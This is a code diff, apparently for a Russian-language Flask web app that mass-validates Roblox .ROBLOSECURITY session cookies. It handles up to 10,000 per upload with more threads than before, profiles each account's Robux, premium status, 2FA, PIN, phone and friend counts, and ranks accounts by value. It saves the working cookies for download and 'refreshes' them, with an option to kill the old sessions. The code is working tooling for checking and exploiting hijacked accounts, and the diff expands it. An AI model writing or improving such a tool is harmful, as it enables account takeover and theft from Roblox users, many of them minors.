@@ -72,22 +72,25 @@ def add_checker_history(entry):
     conn.close()
 
 def add_fresher_history(entry):
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute(
-        "INSERT INTO fresher_history (timestamp, mode, refreshed_count, success_count, fail_count, cookies, old_cookies) VALUES (?, ?, ?, ?, ?, ?, ?)",
-        (
-            datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
-            entry.get('mode', 'duplicate'),
-            entry.get('refreshed_count', 0),
-            entry.get('success_count', 0),
-            entry.get('fail_count', 0),
-            json.dumps(entry.get('cookies', [])[:20]),
-            json.dumps(entry.get('old_cookies', [])[:20])
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute(
+            "INSERT INTO fresher_history (timestamp, mode, refreshed_count, success_count, fail_count, cookies, old_cookies) VALUES (?, ?, ?, ?, ?, ?, ?)",
+            (
+                datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
+                entry.get('mode', 'duplicate'),
+                entry.get('refreshed_count', 0),
+                entry.get('success_count', 0),
+                entry.get('fail_count', 0),
+                json.dumps(entry.get('cookies', [])[:20]),
+                json.dumps(entry.get('old_cookies', [])[:20])
+            )
         )
-    )
-    conn.commit()
-    conn.close()
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        logger.error(f"add_fresher_history error: {e}")
 
 def load_history(table_name):
     conn = sqlite3.connect(DB_PATH)
@@ -145,7 +148,25 @@ def extract_cookies_from_text(text):
     return unique
 
 def get_full_info(cookie):
-    info = {'status':'❌','Username':'?','UserID':'?','Robux':0,'Created':'?','Country':'?','EmailSet':False,'TwoFactorEnabled':False,'AccountPinEnabled':False,'PhoneSet':False,'SecurityStatus':'⚠️ НИЗКИЙ','Cookie':cookie,'PurchasedGamepasses':{},'CreditCardsCount':0,'IsPremium':False,'DonationTotal':0}
+    info = {
+        'status': '❌',
+        'Username': '?',
+        'UserID': '?',
+        'Robux': 0,
+        'Created': '?',
+        'Country': '?',
+        'EmailSet': False,
+        'TwoFactorEnabled': False,
+        'AccountPinEnabled': False,
+        'PhoneSet': False,
+        'SecurityStatus': '⚠️ НИЗКИЙ',
+        'Cookie': cookie,
+        'PurchasedGamepasses': {},
+        'IsPremium': False,
+        'DonationTotal': 0,
+        'FriendsCount': 0,
+        'FollowersCount': 0
+    }
     try:
         c = cookie.strip()
         if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
@@ -179,6 +200,16 @@ def get_full_info(cookie):
         if rb: info['Robux'] = rb.get('robux',0)
         ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
         if ct: info['Country'] = ct.get('countryCode','?')
+        
+        try:
+            fr = s.get(f'https://friends.roblox.com/v1/users/{uid}/friends/count', verify=False, timeout=5)
+            if fr.status_code == 200: info['FriendsCount'] = fr.json().get('count', 0)
+        except: pass
+        try:
+            fl = s.get(f'https://friends.roblox.com/v1/users/{uid}/followers/count', verify=False, timeout=5)
+            if fl.status_code == 200: info['FollowersCount'] = fl.json().get('count', 0)
+        except: pass
+        
         try:
             total = 0; gp_dict = {}; cursor = ""; page = 0
             while page < 5:
@@ -209,40 +240,76 @@ def get_full_info(cookie):
     return info
 
 def quick_validate(cookie):
-    result = {'status':'❌','username':'?','user_id':'?','robux':0,'created':'?','created_ts':0,'is_premium':False,'has_email':False,'has_2fa':False,'cookie':cookie,'score':0}
+    result = {
+        'status': '❌',
+        'username': '?',
+        'user_id': '?',
+        'robux': 0,
+        'created': '?',
+        'created_ts': 0,
+        'is_premium': False,
+        'has_email': False,
+        'has_2fa': False,
+        'has_pin': False,
+        'has_phone': False,
+        'cookie': cookie,
+        'score': 0,
+        'security_status': '⚠️ НИЗКИЙ',
+        'friends_count': 0,
+        'followers_count': 0
+    }
     try:
         c = cookie.strip()
         if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
         s = requests.Session()
         s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
-        r = s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY':c}, timeout=10, verify=False)
+        r = s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': c}, timeout=10, verify=False)
         if r.status_code == 200:
             d = r.json()
             if 'id' in d:
-                result['status'] = '✅'; result['username'] = d.get('name','?'); result['user_id'] = d.get('id','?')
+                result['status'] = '✅'
+                result['username'] = d.get('name', '?')
+                result['user_id'] = d.get('id', '?')
                 uid = result['user_id']
+                
                 try:
-                    rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
-                    if rb.status_code == 200: result['robux'] = rb.json().get('robux',0)
+                    rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', cookies={'.ROBLOSECURITY': c}, timeout=5, verify=False)
+                    if rb.status_code == 200: result['robux'] = rb.json().get('robux', 0)
                 except: pass
+                
                 try:
-                    rd = s.get(f'https://users.roblox.com/v1/users/{uid}', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
+                    rd = s.get(f'https://users.roblox.com/v1/users/{uid}', cookies={'.ROBLOSECURITY': c}, timeout=5, verify=False)
                     if rd.status_code == 200:
-                        cr = rd.json().get('created','')
+                        cr = rd.json().get('created', '')
                         if cr:
-                            result['created'] = datetime.fromisoformat(cr.replace('Z','+00:00')).strftime('%d.%m.%Y')
-                            result['created_ts'] = datetime.fromisoformat(cr.replace('Z','+00:00')).timestamp()
+                            result['created'] = datetime.fromisoformat(cr.replace('Z', '+00:00')).strftime('%d.%m.%Y')
+                            result['created_ts'] = datetime.fromisoformat(cr.replace('Z', '+00:00')).timestamp()
                 except: pass
+                
                 try:
-                    pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
-                    if pm.status_code == 200: result['is_premium'] = pm.json().get('isSubscribed',False)
+                    pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', cookies={'.ROBLOSECURITY': c}, timeout=5, verify=False)
+                    if pm.status_code == 200: result['is_premium'] = pm.json().get('isSubscribed', False)
                 except: pass
+                
                 try:
-                    st = s.get('https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
+                    st = s.get('https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY': c}, timeout=5, verify=False)
                     if st.status_code == 200:
-                        sec = st.json().get('MyAccountSecurityModel',{})
-                        result['has_email'] = sec.get('IsEmailSet',False); result['has_2fa'] = sec.get('IsTwoStepEnabled',False)
+                        sec = st.json().get('MyAccountSecurityModel', {})
+                        result['has_email'] = sec.get('IsEmailSet', False)
+                        result['has_2fa'] = sec.get('IsTwoStepEnabled', False)
+                        result['has_pin'] = sec.get('IsAccountPinEnabled', False)
+                        result['has_phone'] = sec.get('IsPhoneSet', False)
                 except: pass
+                
+                try:
+                    fr = s.get(f'https://friends.roblox.com/v1/users/{uid}/friends/count', cookies={'.ROBLOSECURITY': c}, timeout=3, verify=False)
+                    if fr.status_code == 200: result['friends_count'] = fr.json().get('count', 0)
+                except: pass
+                try:
+                    fl = s.get(f'https://friends.roblox.com/v1/users/{uid}/followers/count', cookies={'.ROBLOSECURITY': c}, timeout=3, verify=False)
+                    if fl.status_code == 200: result['followers_count'] = fl.json().get('count', 0)
+                except: pass
+                
                 score = 0
                 if result['robux'] >= 10000: score += 100
                 elif result['robux'] >= 1000: score += 50
@@ -251,17 +318,30 @@ def quick_validate(cookie):
                 if result['is_premium']: score += 50
                 if result['has_email']: score += 15
                 if result['has_2fa']: score += 10
+                if result['has_pin']: score += 5
+                if result['has_phone']: score += 5
                 if result['created_ts'] > 0:
                     age = (datetime.now().timestamp() - result['created_ts']) / 86400
                     if age > 365*3: score += 30
                     elif age > 365: score += 20
-                result['score'] = score
+                if result['friends_count'] > 100: score += 10
+                if result['followers_count'] > 100: score += 10
+                result['score'] = min(score, 300)
+                
+                sec_count = sum([result['has_email'], result['has_2fa'], result['has_pin'], result['has_phone']])
+                if sec_count >= 3:
+                    result['security_status'] = '🔒 ВЫСОКИЙ'
+                elif sec_count >= 2:
+                    result['security_status'] = '🔐 СРЕДНИЙ'
+                else:
+                    result['security_status'] = '⚠️ НИЗКИЙ'
     except: pass
     return result
 
 def mass_check(cookies_list):
     results = []
-    with ThreadPoolExecutor(max_workers=10) as ex:
+    # УВЕЛИЧИЛИ ПОТОКИ С 10 ДО 20
+    with ThreadPoolExecutor(max_workers=20) as ex:
         futures = {ex.submit(quick_validate, c): c for c in cookies_list}
         for f in as_completed(futures):
             try: results.append(f.result())
@@ -327,6 +407,7 @@ def format_full_report(info):
     r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
     r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
     r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
+    r += f"👥 Друзья: {info.get('FriendsCount', 0)} | 📢 Подписчики: {info.get('FollowersCount', 0)}\n"
     if gp:
         r += "📦 ГЕЙМПАССЫ:\n"
         for game, passes in list(gp.items())[:3]:
@@ -336,11 +417,13 @@ def format_full_report(info):
 
 def format_quick_report(result):
     if result['status'] == '✅':
-        score = result.get('score',0)
-        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else ("🟢" if score>=30 else "🔹")))
+        score = result.get('score', 0)
+        rank = "👑" if score >= 200 else ("💎" if score >= 150 else ("⭐" if score >= 100 else ("🟢" if score >= 60 else "🔹")))
         badges = []
         if result.get('is_premium'): badges.append("💠")
         if result.get('has_2fa'): badges.append("🔐")
+        if result.get('has_pin'): badges.append("📌")
+        if result.get('friends_count', 0) > 100: badges.append("👥")
         return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} | {result['created']} | S:{score} {' '.join(badges)}"
     return "❌ НЕВАЛИД"
 
@@ -726,7 +809,7 @@ async function runMassCheck() {
     
     resBox.textContent = '⏳ Извлечение и проверка...';
     progress.style.width = '10%';
-    logBox.innerHTML = '<div class="log-line">🔄 Запуск многопоточной проверки (10 потоков)...</div>';
+    logBox.innerHTML = '<div class="log-line">🔄 Запуск многопоточной проверки (20 потоков)...</div>';
     
     try {
         var fd = new FormData(); fd.append('file', new Blob([window.massFileContent]));
@@ -781,8 +864,13 @@ function applyFilter(type, element) {
     var html = '🔍 Найдено: ' + filtered.length + '\n\n';
     filtered.forEach(function(r) {
         var score = r.score || 0;
-        var rank = score>=150 ? "👑" : (score>=100 ? "💎" : (score>=60 ? "⭐" : (score>=30 ? "🟢" : "🔹")));
-        html += rank + ' ' + r.username + ' [' + r.user_id + '] | ⏣' + (r.robux||0).toLocaleString() + ' | ' + (r.created||'?') + '\n';
+        var rank = score>=200 ? "👑" : (score>=150 ? "💎" : (score>=100 ? "⭐" : (score>=60 ? "🟢" : "🔹")));
+        var badges = [];
+        if (r.is_premium) badges.push("💠");
+        if (r.has_2fa) badges.push("🔐");
+        if (r.has_pin) badges.push("📌");
+        if (r.friends_count > 100) badges.push("👥");
+        html += rank + ' ' + r.username + ' [' + r.user_id + '] | ⏣' + (r.robux||0).toLocaleString() + ' | ' + (r.created||'?') + ' | S:' + score + ' ' + badges.join(' ') + '\n';
     });
     
     document.getElementById('massResult').textContent = html || 'Нет результатов';
@@ -825,22 +913,28 @@ async function runFresher() {
     if (!cookies) { resBox.textContent = '❌ Вставьте куки!'; return; }
     resBox.textContent = '⏳ Обновление...';
     statsBox.textContent = '';
+    document.getElementById('fresherProgress').style.width = '30%';
     
     var startF = Date.now();
     try {
         var r = await fetch('/api/fresher', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookies: cookies, mode: mode }) });
         var d = await r.json();
+        document.getElementById('fresherProgress').style.width = '100%';
+        setTimeout(function() { document.getElementById('fresherProgress').style.width = '0%'; }, 500);
         var elapsed = ((Date.now() - startF) / 1000).toFixed(1);
         
-        if (d.success && d.only_cookies) {
-            resBox.textContent = d.only_cookies;
+        if (d.success && d.only_cookies !== undefined) {
+            resBox.textContent = d.only_cookies || 'Нет новых куки';
             statsBox.innerHTML = '✅ Успешно: <b>' + d.refreshed_count + '</b> | ❌ Ошибок: <b>' + (d.fail_count || 0) + '</b> | ⏱️ ' + elapsed + 'с';
             loadFresherHistory();
         } else {
             resBox.textContent = '❌ ' + (d.message || 'Не удалось');
             statsBox.innerHTML = '❌ Ошибок: <b>' + (d.fail_count || 'все') + '</b>';
         }
-    } catch(e) { resBox.textContent = '❌ ' + e.message; }
+    } catch(e) {
+        resBox.textContent = '❌ Ошибка запроса: ' + e.message;
+        document.getElementById('fresherProgress').style.width = '0%';
+    }
 }
 
 function clearFresherInputs() {
@@ -968,86 +1062,127 @@ def api_single_check():
 
 @app.route("/api/mass-check", methods=["POST"])
 def api_mass_check():
-    content = ""
-    if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
-    if not content: return jsonify({"success": False, "message": "Файл не предоставлен"})
-    cookies = extract_cookies_from_text(content)
-    extracted_count = len(cookies)
-    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
-    if len(cookies) > 10000: cookies = cookies[:10000]
-    
-    results = mass_check(cookies)
-    valid = [r for r in results if r['status']=='✅']
-    invalid = [r for r in results if r['status']=='❌']
-    formatted = [format_quick_report(r) for r in results]
-    premium_count = sum(1 for r in valid if r.get('is_premium'))
-    total_robux = sum(r.get('robux',0) for r in valid)
-    
-    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-    filename = f"mass_check_{timestamp}.txt"
-    filepath = os.path.join("downloads", filename)
-    with open(filepath, 'w', encoding='utf-8') as f:
-        f.write(f"📊 РЕЗУЛЬТАТЫ | {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
-        f.write(f"Извлечено: {extracted_count} | Проверено: {len(results)} | ✅{len(valid)} | ❌{len(invalid)}\n")
-        f.write(f"Premium: {premium_count} | Robux: {total_robux:,}\n\n")
+    try:
+        content = ""
+        if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
+        if not content: return jsonify({"success": False, "message": "Файл не предоставлен"})
+        cookies = extract_cookies_from_text(content)
+        extracted_count = len(cookies)
+        if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
+        if len(cookies) > 10000: cookies = cookies[:10000]
+        
+        results = mass_check(cookies)
+        valid = [r for r in results if r['status']=='✅']
+        invalid = [r for r in results if r['status']=='❌']
+        formatted = [format_quick_report(r) for r in results]
+        premium_count = sum(1 for r in valid if r.get('is_premium'))
+        total_robux = sum(r.get('robux',0) for r in valid)
+        
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f"mass_check_{timestamp}.txt"
+        filepath = os.path.join("downloads", filename)
+        with open(filepath, 'w', encoding='utf-8') as f:
+            f.write(f"📊 РЕЗУЛЬТАТЫ | {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
+            f.write(f"Извлечено: {extracted_count} | Проверено: {len(results)} | ✅{len(valid)} | ❌{len(invalid)}\n")
+            f.write(f"Premium: {premium_count} | Robux: {total_robux:,}\n\n")
+            for r in valid:
+                score = r.get('score',0)
+                rank = "👑" if score>=200 else ("💎" if score>=150 else ("⭐" if score>=100 else "🟢"))
+                f.write(f"{rank} {r['username']} [{r['user_id']}] | ⏣{r['robux']:,} | Score:{score}\n{r['cookie']}\n\n")
+            if invalid:
+                f.write("\n❌ НЕВАЛИДНЫЕ:\n")
+                for r in invalid: f.write(f"{r['cookie']}\n")
+        
+        download_url = f"/downloads/{filename}"
+        
+        full_data = []
         for r in valid:
-            score = r.get('score',0)
-            rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else "🟢"))
-            f.write(f"{rank} {r['username']} [{r['user_id']}] | ⏣{r['robux']:,} | Score:{score}\n{r['cookie']}\n\n")
-        if invalid:
-            f.write("\n❌ НЕВАЛИДНЫЕ:\n")
-            for r in invalid: f.write(f"{r['cookie']}\n")
-    
-    download_url = f"/downloads/{filename}"
-    
-    full_data = []
-    for r in valid:
-        full_data.append({
-            'status': '✅', 'username': r['username'], 'user_id': r['user_id'],
-            'robux': r['robux'], 'created': r['created'], 'score': r['score'],
-            'is_premium': r.get('is_premium', False), 'has_2fa': r.get('has_2fa', False),
-            'has_email': r.get('has_email', False), 'cookie': r['cookie']
-        })
-    for r in invalid:
-        full_data.append({'status': '❌', 'cookie': r['cookie'], 'score': -1})
-    
-    add_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid), 'cookies': formatted[:30], 'full_data': full_data[:100], 'download_url': download_url})
-    
-    return jsonify({"success": True, "extracted_count": extracted_count, "total": len(results), "valid_count": len(valid), "invalid_count": len(invalid), "premium_count": premium_count, "total_robux": total_robux, "results": formatted, "full_data": full_data, "download_url": download_url})
+            full_data.append({
+                'status': '✅', 'username': r['username'], 'user_id': r['user_id'],
+                'robux': r['robux'], 'created': r['created'], 'score': r['score'],
+                'is_premium': r.get('is_premium', False), 'has_2fa': r.get('has_2fa', False),
+                'has_email': r.get('has_email', False), 'has_pin': r.get('has_pin', False),
+                'friends_count': r.get('friends_count', 0), 'followers_count': r.get('followers_count', 0),
+                'cookie': r['cookie']
+            })
+        for r in invalid:
+            full_data.append({'status': '❌', 'cookie': r['cookie'], 'score': -1})
+        
+        add_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid), 'cookies': formatted[:30], 'full_data': full_data[:100], 'download_url': download_url})
+        
+        return jsonify({"success": True, "extracted_count": extracted_count, "total": len(results), "valid_count": len(valid), "invalid_count": len(invalid), "premium_count": premium_count, "total_robux": total_robux, "results": formatted, "full_data": full_data, "download_url": download_url})
+    except Exception as e:
+        logger.error(f"Mass check error: {e}")
+        return jsonify({"success": False, "message": str(e)})
 
 @app.route("/api/fresher", methods=["POST"])
 def api_fresher():
-    data = request.json or {}
-    raw = data.get("cookies", "")
-    mode = data.get("mode", "duplicate")
-    cookies_list = extract_cookies_from_text(raw)
-    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
-    
-    only_cookies = []
-    cookie_hist = []
-    old_cookies = []
-    success_count = 0
-    fail_count = 0
-    
-    for c in cookies_list:
-        result = refresh_roblox_cookie(c, kill_old=(mode=='kill'))
-        if result['success'] and result['new_cookie']:
-            is_new = True
-            if '.ROBLOSECURITY=' in c:
-                old_val = c.strip().split('.ROBLOSECURITY=')[-1].split(';')[0]
-                is_new = result['new_cookie'] != old_val
-            status_text = "НОВАЯ" if is_new else "БЕЗ ИЗМЕНЕНИЙ"
-            cookie_hist.append(f"🟢 {result.get('username','?')} - {status_text}")
-            only_cookies.append(result['new_cookie'])
-            old_cookies.append(c)
-            success_count += 1
-        else:
-            cookie_hist.append(f"❌ {result.get('error', 'Ошибка')[:40]}")
-            fail_count += 1
-    
-    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'success_count': success_count, 'fail_count': fail_count, 'cookies': cookie_hist, 'old_cookies': old_cookies})
-    
-    return jsonify({"success": True, "refreshed_count": len(only_cookies), "success_count": success_count, "fail_count": fail_count, "only_cookies": '\n'.join(only_cookies) if only_cookies else ''})
+    try:
+        data = request.json or {}
+        raw = data.get("cookies", "")
+        mode = data.get("mode", "duplicate")
+        
+        cookies_list = extract_cookies_from_text(raw)
+        if not cookies_list:
+            return jsonify({"success": False, "message": "Куки не найдены"})
+        
+        only_cookies = []
+        cookie_hist = []
+        old_cookies = []
+        success_count = 0
+        fail_count = 0
+        
+        for c in cookies_list:
+            try:
+                result = refresh_roblox_cookie(c, kill_old=(mode == 'kill'))
+                if result.get('success') and result.get('new_cookie'):
+                    is_new = True
+                    if '.ROBLOSECURITY=' in c:
+                        old_val = c.strip().split('.ROBLOSECURITY=')[-1].split(';')[0]
+                        is_new = result['new_cookie'] != old_val
+                    status_text = "НОВАЯ" if is_new else "БЕЗ ИЗМЕНЕНИЙ"
+                    cookie_hist.append(f"🟢 {result.get('username','?')} - {status_text}")
+                    only_cookies.append(result['new_cookie'])
+                    old_cookies.append(c)
+                    success_count += 1
+                else:
+                    error_msg = result.get('error', 'Ошибка')[:40]
+                    cookie_hist.append(f"❌ {error_msg}")
+                    fail_count += 1
+            except Exception as e:
+                cookie_hist.append(f"❌ {str(e)[:40]}")
+                fail_count += 1
+        
+        try:
+            add_fresher_history({
+                'mode': mode,
+                'refreshed_count': len(only_cookies),
+                'success_count': success_count,
+                'fail_count': fail_count,
+                'cookies': cookie_hist,
+                'old_cookies': old_cookies
+            })
+        except Exception as e:
+            logger.error(f"History save error: {e}")
+        
+        return jsonify({
+            "success": True,
+            "refreshed_count": len(only_cookies),
+            "success_count": success_count,
+            "fail_count": fail_count,
+            "only_cookies": '\n'.join(only_cookies) if only_cookies else ''
+        })
+        
+    except Exception as e:
+        logger.error(f"Fresher error: {e}")
+        return jsonify({
+            "success": False,
+            "message": str(e),
+            "refreshed_count": 0,
+            "success_count": 0,
+            "fail_count": 0,
+            "only_cookies": ''
+        })
 
 @app.route("/api/history/checker")
 def api_history_checker():
